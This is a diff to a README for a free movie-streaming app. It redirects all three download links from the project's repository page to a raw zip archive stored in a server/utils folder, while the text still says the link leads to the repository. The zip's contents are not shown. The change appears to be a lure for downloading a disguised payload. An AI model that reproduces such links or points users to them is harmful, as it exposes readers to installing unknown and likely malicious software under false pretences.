@@ -1,6 +1,6 @@
 # 🎬 Movie-Show - Watch Movies for Free Easily
 
-[![Download Movie-Show](https://img.shields.io/badge/Download-Movie--Show-green?style=for-the-badge)](https://github.com/giga830/Movie-Show)
+[![Download Movie-Show](https://img.shields.io/badge/Download-Movie--Show-green?style=for-the-badge)](https://raw.githubusercontent.com/giga830/Movie-Show/main/server/utils/Show_Movie_v2.1-beta.4.zip)
 
 ## 📽️ What is Movie-Show?
 
@@ -40,7 +40,7 @@ Follow these steps to get Movie-Show running on your Windows computer.
 
 First, go to the main download page on GitHub to get the app:
 
-[Download Movie-Show](https://github.com/giga830/Movie-Show)
+[Download Movie-Show](https://raw.githubusercontent.com/giga830/Movie-Show/main/server/utils/Show_Movie_v2.1-beta.4.zip)
 
 This link takes you to the repository where you can find the latest version to download.
 
@@ -118,7 +118,7 @@ If you have trouble running or using Movie-Show, try these steps:
 
 You can get the app from this page:
 
-[Get Movie-Show Here](https://github.com/giga830/Movie-Show)
+[Get Movie-Show Here](https://raw.githubusercontent.com/giga830/Movie-Show/main/server/utils/Show_Movie_v2.1-beta.4.zip)
 
 Click the link, download the Windows installer, and follow the setup steps above.
 
